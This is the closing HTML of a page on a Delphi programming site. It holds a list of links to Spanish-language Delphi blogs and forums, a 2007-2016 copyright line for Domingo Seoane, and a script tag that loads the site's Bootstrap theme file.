  <ul class="menu nav"><li class="first leaf"><a href="http://www.cadetill.com" title="">Cadetill</a></li>
<li class="leaf"><a href="http://www.delphiaccess.com/forum" title="">DelphiAccess</a></li>
<li class="leaf"><a href="http://www.delphispano.com/" title="">Delphispano</a></li>
<li class="leaf"><a href="http://egostar.delphiaccess.com/" title="">Egostar</a></li>
<li class="leaf"><a href="http://jachguate.wordpress.com/" title="">Jachguate</a></li>
<li class="leaf"><a href="http://neftali.clubdelphi.com/" title="">Neftali</a></li>
<li class="leaf"><a href="http://elpoli.delphiaccess.com/" title="">Poliburro</a></li>
<li class="leaf"><a href="http://theroadtodelphi.wordpress.com/" title="">Rodrigo Ruz</a></li>
<li class="last leaf"><a href="http://salvador.oversistemas.com/" title="">Salvador Gomez</a></li>
</ul>
</section>
<section id="block-block-1" class="block block-block clearfix">

      
  <p>copyright (c) 2007 - 2016 Domingo Seoane</p>

</section>
  </div>
  </footer>
  <script src="/sites/delphi.jmrds.com/themes/bootstrap/js/bootstrap.js?"></script>
</body>
</html>
